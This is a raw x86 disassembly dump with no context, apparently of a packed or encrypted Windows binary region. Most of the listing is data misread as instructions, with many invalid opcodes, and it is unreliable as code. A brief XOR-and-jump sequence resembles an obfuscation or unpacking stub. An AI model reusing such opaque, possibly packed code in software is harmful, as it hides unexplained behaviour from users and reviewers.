  40d71c:	test   eax,0xe4b14240
  40d721:	je     0x40d6fd
  40d723:	xchg   DWORD PTR [eax-0x43f4ebab],esp
  40d729:	jo     0x40d756
  40d72b:	je     0x40d780
  40d72d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d72e:	xchg   esp,eax
  40d72f:	or     dl,BYTE PTR [edx-0x74fecade]
  40d735:	jno    0x40d6ed
  40d737:	add    BYTE PTR [edi],dl
  40d739:	enter  0xa558,0xc3
  40d73d:	sub    eax,0x5526de4c
  40d742:	xor    BYTE PTR [esi+0x68067014],ah
  40d748:	pop    esp
  40d749:	xchg   esp,eax
  40d74a:	call   0x89b80a43
  40d74f:	add    ch,dh
  40d751:	mov    gs,WORD PTR [eax-0x4a3de556]
  40d757:	sub    DWORD PTR [edx-0x4b],esp
  40d75a:	test   al,0x4d
  40d75c:	mov    ah,0xee
  40d75e:	mov    bl,0x3f
  40d760:	cli    
  40d761:	pop    ebp
  40d762:	mov    bl,0x60
  40d764:	xchg   esp,eax
  40d765:	xchg   DWORD PTR [ecx+0x53],edx
  40d768:	xlat   BYTE PTR ds:[ebx]
  40d769:	inc    esi
  40d76a:	jns    0x40d7cc
  40d76c:	cmp    edx,DWORD PTR [edi+ebx*4+0x44d48ac]
  40d773:	aaa    
  40d774:	mov    edi,0xa83f2591
  40d779:	clc    
  40d77a:	out    0x97,al
  40d77c:	pushf  
  40d77d:	mov    ebp,DWORD PTR [edx-0x4de93799]
  40d783:	sbb    DWORD PTR ds:[edi+0xb],eax
  40d787:	scas   eax,DWORD PTR es:[edi]
  40d788:	(bad)  
  40d789:	repnz cmp eax,0x69860322
  40d78f:	fistp  DWORD PTR [esi-0x5f]
  40d792:	dec    esp
  40d793:	jmp    DWORD PTR [esi]
  40d795:	(bad)  
  40d796:	and    BYTE PTR [edx],dh
  40d798:	fisttp QWORD PTR [edx+0x67]
  40d79b:	sbb    al,0xc7
  40d79d:	jae    0x40d7c6
  40d79f:	push   edi
  40d7a0:	fadd   QWORD PTR [ebp+0x4f65b948]
  40d7a6:	mov    ah,0xfe
  40d7a8:	sti    
  40d7a9:	dec    ebp
  40d7aa:	pop    ebx
  40d7ab:	mov    dl,0xb2
  40d7ad:	or     ecx,eax
  40d7af:	aas    
  40d7b0:	fimul  WORD PTR [edx]
  40d7b2:	inc    esp
  40d7b3:	mov    ch,0xea
  40d7b5:	and    eax,0x90c1dfe3
  40d7ba:	jecxz  0x40d76c
  40d7bc:	ins    BYTE PTR es:[edi],dx
  40d7bd:	sbb    BYTE PTR [ebp+0x37ffa7a4],cl
  40d7c3:	adc    ebx,DWORD PTR [ebp+ebx*4+0x6e]
  40d7c7:	clc    
  40d7c8:	retf   
  40d7c9:	ss add eax,0x2032d240
  40d7cf:	pop    ebx
  40d7d0:	(bad)  
  40d7d1:	je     0x40d780
  40d7d3:	fwait
  40d7d4:	ja     0x40d790
  40d7d6:	es or  ebp,esi
  40d7d9:	pop    ds
  40d7da:	mov    bh,bh
  40d7dc:	dec    ecx
  40d7dd:	jb     0x40d7e7
  40d7df:	jnp    0x40d830
  40d7e1:	xchg   edx,eax
  40d7e2:	nop
  40d7e3:	jecxz  0x40d801
  40d7e5:	xor    ebp,DWORD PTR [eax-0x26]
  40d7e8:	push   ss
  40d7e9:	or     BYTE PTR [esi-0x48e99568],0xf4
  40d7f0:	add    BYTE PTR [edi],0x57
  40d7f3:	mov    eax,ds:0x5a3530f4
  40d7f8:	mov    ecx,0xf59407fd
  40d7fd:	outs   dx,DWORD PTR ds:[esi]
  40d7fe:	shr    ah,1
  40d800:	ret    
  40d801:	jnp    0x40d7f0
  40d803:	retf   0x1081
  40d806:	xchg   esp,ecx
  40d808:	fistp  QWORD PTR [esi+0x77]
  40d80b:	hlt    
  40d80c:	not    BYTE PTR [ecx-0x27]
  40d80f:	cmc    
  40d810:	les    ecx,FWORD PTR [edx]
  40d812:	inc    ebx
  40d813:	jae    0x40d7d3
  40d815:	test   DWORD PTR [eax+0x71875fe0],edx
  40d81b:	call   0x7530:0xe60cd401
  40d822:	xor    ebp,ebp
  40d824:	imul   eax,DWORD PTR [ecx+0x24690b38],0xf77d09f7
  40d82e:	pushf  
  40d82f:	xor    BYTE PTR [ecx+eax*1+0x2160eea1],dl
  40d836:	xor    cl,cl
  40d838:	mov    edi,0x50e6aba6
  40d83d:	pop    ebx
  40d83e:	js     0x40d83a
  40d840:	jne    0x40d7dd
  40d842:	scas   al,BYTE PTR es:[edi]
  40d843:	mov    eax,0xdddc5cd0
  40d848:	jp     0x40d87f
  40d84a:	call   0xd1f732d3
  40d84f:	scas   eax,DWORD PTR es:[edi]
  40d850:	push   ds
  40d851:	xor    BYTE PTR [ebx+esi*8],bh
  40d854:	call   0x1e3d3b59
  40d859:	in     eax,0xe1
  40d85b:	xchg   ecx,eax
  40d85c:	lods   eax,DWORD PTR ds:[esi]
  40d85d:	inc    ecx
  40d85e:	xor    BYTE PTR [edi-0x5ae34212],bl
  40d864:	cmp    ebx,DWORD PTR [esi-0x736d6509]
  40d86a:	mov    dl,0x9c
  40d86c:	push   ss
  40d86d:	sub    BYTE PTR [eax+0x35b59ff9],ch
  40d873:	push   eax
  40d874:	cmp    esi,edx
  40d876:	sahf   
  40d877:	xor    DWORD PTR [edx],esi
  40d879:	inc    ecx
  40d87a:	out    dx,al
  40d87b:	or     esp,0x67219a6b
  40d881:	sbb    al,0x96
  40d883:	ins    DWORD PTR es:[edi],dx
  40d884:	pop    ebx
  40d885:	or     bl,dh
  40d887:	pop    edx
  40d888:	xor    BYTE PTR [edi+edi*4-0xd],cl
  40d88c:	dec    ebx
  40d88d:	adc    BYTE PTR [edi+0x2a316085],dl
  40d893:	jp     0x40d826
  40d895:	xor    BYTE PTR [esi],0x57
  40d898:	inc    esp
  40d899:	mov    esi,0xfa9a1b2e
  40d89e:	nop
  40d89f:	xchg   ebx,eax
  40d8a0:	pop    edi
  40d8a1:	popa   
  40d8a2:	pop    esp
  40d8a3:	ins    DWORD PTR es:[edi],dx
  40d8a4:	fs push 0xc7228d4
  40d8aa:	jae    0x40d866
  40d8ac:	xor    edi,eax
  40d8ae:	inc    ebx
  40d8af:	in     al,0xa3
  40d8b1:	jl     0x40d839
  40d8b3:	sbb    ebp,DWORD PTR es:[esi-0x3a]
  40d8b7:	lds    ecx,FWORD PTR [eax-0x51d86e]
  40d8bd:	xchg   ebp,eax
  40d8be:	(bad)  
  40d8bf:	mov    bl,0x73
  40d8c1:	dec    esi
  40d8c2:	dec    eax
  40d8c3:	cdq    
  40d8c4:	dec    ebx
  40d8c5:	fist   WORD PTR fs:[edx-0x40]
  40d8c9:	and    eax,0x17d95926
  40d8ce:	jne    0x40d929
  40d8d0:	pushf  
  40d8d1:	sbb    DWORD PTR ds:[ebx+0x76],esp
  40d8d5:	rcl    ebp,1
  40d8d7:	test   eax,0xd3802cd3
  40d8dc:	inc    edi
  40d8dd:	mov    eax,0x6da31063
  40d8e2:	mov    WORD PTR [edx-0x38],cs
  40d8e5:	push   fs
  40d8e7:	ret    0x2f7b
  40d8ea:	(bad)  
  40d8eb:	and    BYTE PTR [ebp-0x39],dh
  40d8ee:	push   ds
  40d8ef:	xchg   esi,eax
  40d8f0:	mov    eax,DWORD PTR [ebp-0x7c68e5ab]
  40d8f6:	push   edi
  40d8f7:	push   esi
  40d8f8:	idiv   BYTE PTR [esi+0x2b79d986]
  40d8fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8ff:	xor    ebx,ebx
  40d901:	sub    edi,DWORD PTR [ebx-0x6]
  40d904:	xchg   esi,eax
  40d905:	call   0x1caf:0x708a8d26
  40d90c:	call   0xb3c6f01e
  40d911:	call   0x28b7:0xf262a905
  40d918:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d91a:	fistp  QWORD PTR [edi+ebp*4-0x27]
  40d91e:	sub    dh,BYTE PTR [ecx]
  40d920:	cmp    eax,0xd06fc362
  40d925:	mov    dh,0x95
  40d927:	dec    DWORD PTR [edi]
  40d929:	jecxz  0x40d995
  40d92b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d92c:	inc    ebp
  40d92d:	mov    ebx,0x4f7fe180
  40d932:	sub    DWORD PTR [ebx-0x67],edx
  40d935:	test   al,0xf5
  40d937:	sbb    eax,0xf440af65
  40d93c:	xor    DWORD PTR ds:0x7fdcd637,esp
  40d942:	test   BYTE PTR [esi-0x43],0x83
  40d946:	imul   edx,ebx,0xb6629be
  40d94c:	stos   BYTE PTR es:[edi],al
  40d94d:	or     ah,BYTE PTR [esi]
  40d94f:	int    0x8a
  40d951:	rcl    DWORD PTR [ecx],0x21
  40d954:	ss out 0xd5,eax
  40d957:	das    
  40d958:	hlt    
  40d959:	popa   
  40d95a:	jae    0x40d9db
  40d95c:	xlat   BYTE PTR ds:[ebx]
  40d95d:	clc    
  40d95e:	and    ecx,esi
  40d960:	sar    BYTE PTR [ebp+ebx*8-0x208be77c],0xc2
  40d968:	sti    
  40d969:	leave  
  40d96a:	sbb    eax,0xbfe6f7b8
  40d96f:	cmp    edi,edx
  40d971:	mov    es,WORD PTR [ebp-0x31]
  40d974:	jnp    0x40d92a
  40d976:	sbb    al,BYTE PTR [esi+ecx*2]
  40d979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d97a:	pop    ebx
  40d97b:	mov    eax,0x305e5171
  40d980:	and    DWORD PTR [edx+edi*8],ebx
  40d983:	lods   al,BYTE PTR ds:[esi]
  40d984:	test   BYTE PTR [eax-0x20],bh
  40d987:	lods   al,BYTE PTR ds:[esi]
  40d988:	stos   DWORD PTR es:[edi],eax
  40d989:	cmp    dl,dl
  40d98b:	xor    ah,BYTE PTR [edx]
  40d98d:	ins    BYTE PTR es:[edi],dx
  40d98e:	fstp   TBYTE PTR [edx+0x4cd70a2e]
  40d994:	add    DWORD PTR [ebp+0x5d5dad68],esp
  40d99a:	jbe    0x40d96a
  40d99c:	sub    ch,dh
  40d99e:	mov    eax,0xba47628e
  40d9a3:	pushf  
  40d9a4:	cdq    
  40d9a5:	in     al,dx
  40d9a6:	dec    eax
  40d9a7:	cs fwait
  40d9a9:	mov    BYTE PTR [esi],bl
  40d9ab:	subps  xmm3,xmm0
  40d9ae:	popf   
  40d9af:	popf   
  40d9b0:	and    dl,bh
  40d9b2:	out    dx,al
  40d9b3:	sbb    esp,DWORD PTR [ebx+0x242cffc3]
  40d9b9:	push   0xffffff80
  40d9bb:	push   0x8c6a1bd8
  40d9c0:	fwait
  40d9c1:	repz jno 0x40da15
  40d9c4:	ret    0x9bff
  40d9c7:	inc    esp
  40d9c8:	mov    ds:0xf9afcda,al
  40d9cd:	xor    esi,DWORD PTR [eax]
  40d9cf:	aas    
  40d9d0:	jl     0x40d9a7
  40d9d2:	mov    bh,0x9d
  40d9d4:	int    0x5e
  40d9d6:	adc    bl,0xc6
  40d9d9:	jbe    0x40d97b
  40d9db:	test   BYTE PTR [edx],0xa9
  40d9de:	inc    ebx
  40d9e0:	mov    bh,0x61
  40d9e2:	xor    al,0x9b
  40d9e4:	xor    BYTE PTR [ecx+0x42],ah
  40d9e7:	adc    edx,ecx
  40d9e9:	or     BYTE PTR [edx-0x487b7801],0x84
  40d9f0:	lock jmp 0xbf86e9c7
  40d9f6:	ss (bad) 
  40d9f8:	lock adc dh,BYTE PTR [ebp+eax*4+0x59c93441]
  40da00:	shr    cl,1
  40da02:	retf   
  40da03:	jbe    0x40d9ef
  40da05:	adc    ebx,DWORD PTR [ebp+eax*1+0x3c1ec314]
  40da0c:	mov    al,0x8b
  40da0e:	jae    0x40da05
  40da10:	add    ecx,DWORD PTR [ebx]
  40da12:	fcmovnu st,st(7)
  40da14:	icebp  
  40da15:	stc    
  40da16:	in     al,0x79
  40da18:	xchg   ebp,eax
  40da19:	outs   dx,BYTE PTR ds:[esi]
  40da1a:	out    0xff,eax
  40da1c:	adc    cl,0xd6
  40da1f:	jbe    0x40da6c
  40da21:	dec    esi
  40da22:	add    esp,DWORD PTR [esp+ebp*1+0xb9d842b]
  40da29:	ja     0x40da8c
  40da2b:	jo     0x40d9f3
  40da2d:	out    dx,al
  40da2e:	mov    al,0xb1
  40da30:	and    ebp,DWORD PTR [edi]
  40da32:	mov    ss,edi
  40da34:	and    ebx,esp
  40da36:	inc    esp
  40da37:	icebp  
  40da38:	or     DWORD PTR gs:[ebx+0x66],esp
  40da3c:	sar    al,0x91
  40da3f:	je     0x40da8f
  40da41:	in     eax,dx
  40da42:	int3   
  40da43:	ficomp WORD PTR [edx+0x14]
  40da46:	or     eax,DWORD PTR [edi]
  40da48:	(bad)  
  40da49:	mov    dh,0x28
  40da4b:	cwde   
  40da4c:	in     al,dx
  40da4d:	jmp    0x40d9d9
  40da4f:	pop    edx
  40da50:	jb     0x40da0a
  40da52:	push   ss
  40da53:	xchg   edx,eax
  40da54:	sahf   
  40da55:	cs xchg edx,eax
  40da57:	jge    0x40d9f7
  40da59:	mov    ecx,0x8d8748
  40da5e:	mov    cl,bh
  40da60:	sbb    DWORD PTR [ebx],eax
  40da62:	outs   dx,BYTE PTR ds:[esi]
  40da63:	or     ebp,DWORD PTR [edx]
  40da65:	xchg   ecx,eax
  40da66:	lods   al,BYTE PTR ds:[esi]
  40da67:	in     eax,dx
  40da68:	xchg   ecx,eax
  40da69:	call   0x72f42444
  40da6e:	mov    eax,0xf4b05c35
  40da73:	mov    ?,WORD PTR [edi+0x1c]
  40da76:	ror    BYTE PTR [edx+ecx*4-0x45],0xe6
  40da7b:	ins    BYTE PTR es:[edi],dx
  40da7c:	xchg   ecx,eax
  40da7d:	push   ss
  40da7e:	mov    bl,0x3b
  40da80:	leave  
  40da81:	sub    dh,BYTE PTR [edx-0x33ad3e22]
  40da87:	dec    ebp
  40da88:	outs   dx,DWORD PTR ds:[esi]
  40da89:	adc    DWORD PTR [eax],edi
  40da8b:	aas    
  40da8c:	inc    edi
  40da8d:	jle    0x40dab4
  40da8f:	add    ax,0xfe35
  40da93:	fld    QWORD PTR [edi-0x14]
  40da96:	inc    ecx
  40da97:	dec    edi
  40da98:	dec    ebp
  40da99:	in     al,dx
  40da9a:	mov    bl,0x23
  40da9c:	xchg   ecx,eax
  40da9d:	(bad)  
  40da9e:	add    DWORD PTR ds:0xf77e40fc,ebx
  40daa4:	adc    ecx,DWORD PTR [edx]
  40daa6:	mov    ecx,DWORD PTR [ebp-0x4]
  40daa9:	xor    ecx,eax
  40daab:	mov    eax,ds:0x422344
  40dab0:	lea    eax,[ecx+eax*1-0xf82f]
  40dab7:	xor    DWORD PTR ds:0x42233c,eax
  40dabd:	mov    eax,DWORD PTR [ebp-0x8]
  40dac0:	mov    ecx,DWORD PTR ds:0x422608
  40dac6:	jmp    0x40de81
  40dacb:	aad    0xc7
  40dacd:	mov    dh,0x63
  40dacf:	mov    esp,0x5b7d15b3
  40dad4:	shl    DWORD PTR [ebp+0x3f9f45fb],0x71
  40dadb:	xor    dh,cl
  40dadd:	mov    ebx,0xbbc5efbb
  40dae2:	mov    ebx,0x41d96401
  40dae7:	shr    DWORD PTR [edi],cl
  40dae9:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40daeb:	mov    cl,0x5f
  40daed:	pop    eax
  40daee:	iret   
  40daef:	inc    esp
  40daf0:	fdivrp st(5),st
  40daf2:	dec    edx
  40daf3:	(bad)  
  40daf5:	fcmove st,st(7)
  40daf7:	xchg   ebp,eax
  40daf8:	xor    eax,DWORD PTR [ecx-0x32fb4308]
  40dafe:	fcom   DWORD PTR [ebx+0x6003f9fd]
  40db04:	mov    esp,0x6a424622
  40db09:	add    BYTE PTR [esi-0x44],0x2e
  40db0d:	dec    esp
  40db0e:	retf   0x8d10
  40db11:	sar    BYTE PTR [edi+0x62],1
  40db14:	mov    dh,0xa
  40db16:	ins    DWORD PTR es:[edi],dx
  40db17:	or     eax,DWORD PTR [esi-0x3ac575a2]
  40db1d:	lahf   
  40db1e:	scas   al,BYTE PTR es:[edi]
  40db1f:	shl    DWORD PTR [ecx+esi*1+0x630fd5b8],1
  40db26:	(bad)  
  40db28:	mov    dl,0xe8
  40db2a:	pop    es
  40db2b:	mov    al,ds:0x9a56840b
  40db30:	dec    edi
  40db31:	(bad)  
  40db32:	fist   WORD PTR [eax-0x5360431c]
  40db38:	or     al,0x7b
  40db3a:	push   0x1794c289
  40db3f:	adc    DWORD PTR [esi-0x7f9f751b],edi
  40db45:	mov    edx,0xaf558a13
  40db4a:	lods   eax,DWORD PTR ds:[esi]
  40db4b:	add    DWORD PTR [edi-0x69187bbc],0x16e7eaf2
  40db55:	cwde   
  40db56:	int3   
  40db57:	sbb    eax,0x75284dcf
  40db5c:	pop    esp
  40db5d:	mov    WORD PTR [eax],cs
  40db5f:	mov    ?,ebx
  40db61:	pop    ebx
  40db62:	adc    bh,BYTE PTR [eax+0x694e5588]
  40db68:	hlt    
  40db69:	ins    BYTE PTR es:[edi],dx
  40db6a:	ja     0x40db26
  40db6c:	pop    eax
  40db6d:	mov    edi,0x19395c3c
  40db72:	sahf   
  40db73:	dec    ecx
  40db74:	aam    0x3
  40db76:	ret    
  40db77:	cmp    DWORD PTR [ebx],eax
  40db79:	mov    ds:0x7927e30,al
  40db7e:	nop
  40db7f:	dec    edi
  40db80:	shl    DWORD PTR [ecx+0x557f6ab0],0xe6
  40db87:	sbb    DWORD PTR [ebx+0x1f9b135e],esp
  40db8d:	in     eax,0x59
  40db8f:	fsubr  DWORD PTR [ebp-0x52]
  40db92:	push   ds
  40db93:	fist   WORD PTR [esi]
  40db95:	or     al,0xbe
  40db97:	loop   0x40dbad
  40db99:	ins    DWORD PTR es:[edi],dx
  40db9a:	sub    eax,0xaa4c1b04
  40db9f:	xchg   dl,al
  40dba1:	mov    esi,0x4ad82220
  40dba6:	xor    dh,bl
  40dba8:	mov    al,ds:0xbc46f4b6
  40dbad:	stc    
  40dbae:	xor    eax,0x8bef67c4
  40dbb3:	outs   dx,BYTE PTR ds:[esi]
  40dbb4:	sub    eax,0x36d17181
  40dbb9:	jle    0x40dc33
  40dbbb:	outs   dx,BYTE PTR ds:[esi]
  40dbbc:	mov    bh,0x38
  40dbbe:	out    0xc6,al
  40dbc0:	cdq    
  40dbc1:	bound  esp,QWORD PTR [edx]
  40dbc3:	or     BYTE PTR [ebp+0x13e53b3c],ch
  40dbc9:	mov    ecx,0x5f0f1fde
  40dbce:	rol    BYTE PTR [edi-0x67bf7b23],cl
  40dbd4:	je     0x40dbcd
  40dbd6:	shr    DWORD PTR [eax],1
  40dbd8:	mov    ch,0xc4
  40dbda:	sti    
  40dbdb:	cmp    dh,BYTE PTR [ebx-0x67]
  40dbde:	add    eax,0x1557c30d
  40dbe3:	jne    0x40db94
  40dbe5:	pop    ecx
  40dbe6:	stos   DWORD PTR es:[edi],eax
  40dbe7:	int3   
  40dbe8:	test   DWORD PTR [ebp+0x5bf35991],esi
  40dbee:	dec    edi
  40dbef:	push   ss
  40dbf0:	stos   DWORD PTR es:[edi],eax
  40dbf1:	or     BYTE PTR [ebx+0x53],0xf
  40dbf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbf6:	ret    
  40dbf7:	ror    ecx,cl
  40dbf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbfa:	sub    eax,0x8660a5ad
  40dbff:	or     eax,0xfbf9ecd3
  40dc04:	and    al,0x3f
  40dc06:	ins    BYTE PTR es:[edi],dx
  40dc07:	dec    ebp
  40dc08:	pop    es
  40dc09:	scas   eax,DWORD PTR es:[edi]
  40dc0a:	dec    edi
  40dc0b:	push   0x3d2e4888
  40dc10:	sbb    dl,BYTE PTR [eax+0x17d73217]
  40dc16:	pop    eax
  40dc17:	out    0xb3,al
  40dc19:	and    eax,0x8ff20172
  40dc1e:	test   DWORD PTR [ebx],ebp
  40dc20:	pop    ds
  40dc21:	in     al,0x9e
  40dc23:	call   0x599af7d0
  40dc28:	cli    
  40dc29:	es add al,0x69
  40dc2c:	fcom   st(3)
  40dc2e:	mov    DWORD PTR [edi+0x35a2fd85],ebx
  40dc34:	lods   al,BYTE PTR ds:[esi]
  40dc35:	fstp   TBYTE PTR [ecx]
  40dc37:	sahf   
  40dc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc39:	jo     0x40dc5c
  40dc3b:	lds    esp,FWORD PTR [ebp-0x526efe87]
  40dc41:	jp     0x40dc5f
  40dc43:	pop    ecx
  40dc44:	pop    edx
  40dc45:	pop    ebp
  40dc46:	mov    edx,0x504f74dc
  40dc4b:	(bad)  
  40dc4c:	fld    DWORD PTR [eax]
  40dc4e:	test   DWORD PTR fs:[ebx+eax*2-0x52],0xed2d0807
  40dc57:	add    eax,0x60e558e3
  40dc5c:	(bad)  
  40dc5d:	aad    0xab
  40dc5f:	sub    dl,BYTE PTR [esi]
  40dc61:	ja     0x40dc2c
  40dc63:	mov    bl,0x51
  40dc65:	sbb    BYTE PTR [edx-0x61],dl
  40dc68:	push   ds
  40dc69:	jno    0x40dc3d
  40dc6b:	or     eax,0xe429412c
  40dc70:	sbb    eax,0xeaf5c820
  40dc75:	aaa    
  40dc76:	and    esp,DWORD PTR [ebx]
  40dc78:	sub    ah,BYTE PTR [edi+0x43ac5a33]
  40dc7e:	aad    0xd5
  40dc80:	mov    esi,0x2e71c929
  40dc85:	inc    eax
  40dc86:	mov    ch,0x1e
  40dc88:	xchg   esi,eax
  40dc89:	mov    ds:0xdcbc3a85,al
  40dc8e:	push   esi
  40dc8f:	fst    QWORD PTR [ecx]
  40dc91:	ror    DWORD PTR [esi-0x2225a267],cl
  40dc97:	int    0x19
  40dc99:	adc    DWORD PTR [ebp+0x40e777d3],esi
  40dc9f:	dec    edi
  40dca0:	(bad)  
  40dca1:	ins    DWORD PTR es:[edi],dx
  40dca2:	sbb    eax,0xe65386ec
  40dca7:	jl     0x40dc5a
  40dca9:	clc    
  40dcaa:	inc    esi
  40dcab:	shr    BYTE PTR [ecx],1
  40dcad:	xchg   esi,eax
  40dcae:	ja     0x40dd2a
  40dcb0:	jb     0x40dc54
  40dcb2:	jnp    0x40dcde
  40dcb4:	xchg   esp,eax
  40dcb5:	ror    dh,0xd6
  40dcb8:	lea    edx,[esi+0x33f0dcc]
  40dcbe:	mov    eax,0x4fb9b2d2
  40dcc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcc4:	and    al,0xda
  40dcc6:	sub    BYTE PTR [esi+0x6f],0x59
  40dcca:	adc    ebp,DWORD PTR [edx-0x16]
  40dccd:	imul   ebx,edx,0xffffffb3
  40dcd0:	xor    dl,ch
  40dcd2:	pop    edx
  40dcd3:	imul   edi,DWORD PTR [ebx-0x69],0x26a39450
  40dcda:	sbb    esp,DWORD PTR [ebx-0x6d03f6c3]
  40dce0:	fisttp DWORD PTR [ecx+0x5d]
  40dce3:	push   es
  40dce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dce5:	pop    es
  40dce6:	xchg   edx,eax
  40dce7:	rcr    DWORD PTR [ecx],cl
  40dce9:	push   es
  40dcea:	sti    
  40dceb:	es cmp eax,0x704acf73
  40dcf1:	ins    DWORD PTR es:[edi],dx
  40dcf2:	pushf  
  40dcf3:	pop    edx
  40dcf4:	push   0x7e9de1be
  40dcf9:	(bad)  
  40dcfa:	dec    edx
  40dcfb:	stc    
  40dcfc:	nop
  40dcfd:	fsub   QWORD PTR [edi-0x27d0cc2f]
  40dd03:	xchg   ebx,eax
  40dd04:	or     al,0x11
  40dd06:	jmp    0x40dc93
  40dd08:	mov    WORD PTR [edi],?
  40dd0a:	or     DWORD PTR [ebx-0x7a151d43],ecx
  40dd10:	aad    0x96
  40dd12:	cmp    BYTE PTR [ebp-0x3e6c514a],al
  40dd18:	sbb    ah,BYTE PTR [ebx+0x24]
  40dd1b:	enter  0x2f77,0x5a
  40dd1f:	add    BYTE PTR [ebp+0x4f],0x9d
  40dd23:	xchg   esp,eax
  40dd24:	and    BYTE PTR [eax+ecx*2],ch
  40dd27:	pop    eax
  40dd28:	sets   dh
  40dd2b:	push   ebp
  40dd2c:	lahf   
  40dd2d:	dec    edx
  40dd2e:	out    0x78,eax
  40dd30:	(bad)  
  40dd31:	aaa    
  40dd32:	mov    ecx,0xe8d8c46c
  40dd37:	lock jp 0x40dd5a
  40dd3a:	das    
  40dd3b:	je     0x40dd95
  40dd3d:	xchg   dl,cl
  40dd3f:	cmp    eax,0xdae2a22b
  40dd44:	(bad)  
  40dd46:	jno    0x40dd4b
  40dd48:	inc    edi
  40dd49:	mul    esi
  40dd4b:	rol    DWORD PTR [edx],cl
  40dd4d:	or     ebx,eax
  40dd4f:	mov    cl,BYTE PTR [edi+0x14]
  40dd52:	mov    ebx,0x222436f5
  40dd57:	nop
  40dd58:	adc    BYTE PTR [esi+0x65],ah
  40dd5b:	lahf   
  40dd5c:	cmp    eax,0xd3788a6e
  40dd61:	dec    ebx
  40dd62:	adc    eax,edi
  40dd64:	pop    esi
  40dd65:	push   ebx
  40dd66:	sbb    al,bl
  40dd68:	stos   BYTE PTR es:[edi],al
  40dd69:	and    DWORD PTR [ebx-0x6ebf30c4],0xffffffd1
  40dd70:	xlat   BYTE PTR ds:[ebx]
  40dd71:	pop    ss
  40dd72:	xchg   ebp,eax
  40dd73:	and    BYTE PTR [edx-0x6e],dh
  40dd76:	mov    dl,0xfc
  40dd78:	enter  0x3034,0x4c
  40dd7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd7d:	pusha  
  40dd7e:	push   ecx
  40dd7f:	js     0x40ddd8
  40dd81:	in     eax,dx
  40dd82:	sbb    eax,0x589abbb3
  40dd87:	mov    DWORD PTR [ecx+esi*2],ecx
  40dd8a:	pop    esp
  40dd8b:	mov    eax,ebx
  40dd8d:	outs   dx,BYTE PTR ds:[esi]
  40dd8e:	mov    WORD PTR [esi+0x12],?
  40dd91:	sbb    ch,BYTE PTR [edi+0x7a]
  40dd94:	aas    
  40dd95:	in     eax,dx
  40dd96:	dec    edx
  40dd97:	cmp    DWORD PTR [esi+edi*8],edi
  40dd9a:	or     BYTE PTR ds:0x12de4740,dh
  40dda0:	pop    esp
  40dda1:	pop    edi
  40dda2:	jl     0x40de0d
  40dda4:	repnz shl DWORD PTR [ebx+0x78],0x6b
  40dda9:	cmp    edx,edi
  40ddab:	daa    
  40ddac:	add    eax,0x95402e3d
  40ddb1:	and    esp,DWORD PTR [edi+edx*2-0x7c86b775]
  40ddb8:	dec    edi
  40ddb9:	cli    
  40ddba:	sti    
  40ddbb:	int    0x1b
  40ddbd:	int3   
  40ddbe:	mov    ebx,DWORD PTR [edi+eax*8-0x1b077d6b]
  40ddc5:	cmp    edx,DWORD PTR [esi]
  40ddc7:	out    dx,eax
  40ddc8:	retf   0x7665
  40ddcb:	call   0x837a:0x9877f651
  40ddd2:	push   cs
  40ddd3:	rol    BYTE PTR [ecx+0x2658c178],1
  40ddd9:	mov    eax,0x513c7434
  40ddde:	xor    eax,0x5ad01bd1
  40dde3:	jmp    0x458a305a
  40dde8:	leave  
  40dde9:	(bad)  [edx-0x5bf3572d]
  40ddef:	loopne 0x40de1e
  40ddf1:	(bad)  
  40ddf2:	loopne 0x40dd98
  40ddf4:	ds jbe 0x40dda8
  40ddf7:	jb     0x40ddfc
  40ddf9:	cdq    
  40ddfa:	lods   eax,DWORD PTR ds:[esi]
  40ddfb:	sub    eax,ebp
  40ddfd:	fidivr WORD PTR [ebx-0x79ce54f]
  40de03:	xchg   ecx,eax
  40de04:	cmp    ch,BYTE PTR [edi-0x4f]
  40de07:	enter  0x303c,0x3e
  40de0b:	or     DWORD PTR [ecx],esi
  40de0d:	in     eax,0x1f
  40de0f:	out    0x9a,eax
  40de11:	in     eax,0x6b
  40de13:	and    esp,DWORD PTR [edx]
  40de15:	shl    DWORD PTR [ecx+0x832ae43],cl
  40de1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de1d:	mov    ecx,0xdac02199
  40de22:	fidiv  DWORD PTR [esi+0x39]
  40de25:	push   edx
  40de26:	adc    al,BYTE PTR [esi]
  40de28:	mov    dh,0xcc
  40de2a:	mov    bl,ch
  40de2c:	xchg   esp,eax
  40de2d:	jmp    0x56518a35
  40de32:	je     0x5b22f483
  40de38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de39:	test   DWORD PTR [edx],esp
  40de3b:	xchg   ebx,eax
  40de3c:	rcr    BYTE PTR [ecx+0x36a720de],1
  40de42:	pop    edi
  40de43:	lock loope 0x40dde7
  40de46:	loope  0x40de42
  40de48:	and    DWORD PTR [ecx],edx
  40de4a:	sbb    esp,edx
  40de4c:	pop    edx
  40de4d:	fcom   DWORD PTR [ebx]
  40de4f:	lea    esi,[ebx+0x7b]
  40de52:	pop    edx
  40de53:	icebp  
  40de54:	mov    ah,0x0
  40de56:	push   ebp
  40de57:	xchg   edx,eax
  40de58:	jae    0x40de3c
  40de5a:	shl    BYTE PTR [edi-0x46],0xe7
  40de5e:	and    eax,0xf7720d1b
  40de63:	adc    al,0x3d
  40de65:	cwde   
  40de66:	mov    ebp,0x6f178ef0
  40de6b:	xor    al,0x76
  40de6d:	sbb    BYTE PTR [eax-0x1958cbd5],bl
  40de73:	mov    eax,0xe73b3d80
  40de78:	push   ecx
  40de79:	pop    esp
  40de7a:	cmc    
  40de7b:	daa    
  40de7c:	lods   al,BYTE PTR ds:[esi]
  40de7d:	clc    
  40de7e:	jmp    0xc0aa1daa
  40de83:	push   ds
  40de84:	sbb    BYTE PTR [eax],al
